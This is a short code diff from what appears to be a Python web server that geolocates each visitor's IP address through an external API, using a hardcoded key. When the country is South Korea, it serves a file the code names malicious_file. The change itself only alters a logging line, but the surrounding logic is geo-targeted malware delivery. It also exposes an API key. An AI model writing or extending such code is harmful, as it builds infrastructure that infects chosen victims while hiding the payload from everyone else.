@@ -10,9 +10,9 @@ def home():
     api_param = {"key": "me58wbfwetp7mmq7is1fkqcgxcot", "host": remote_addr}
     
     res = requests.get(url="https://api.itforest.net/ipinfo", params=api_param)
-    print(f'[*] api response: {res.json()}')
     
     country_code = res.json()["data"].get("country_code", None)
+    print(f'[*] remote_addr: {remote_addr}, country: {country_code}')
 
     if country_code == "KR":
         path = malicious_file
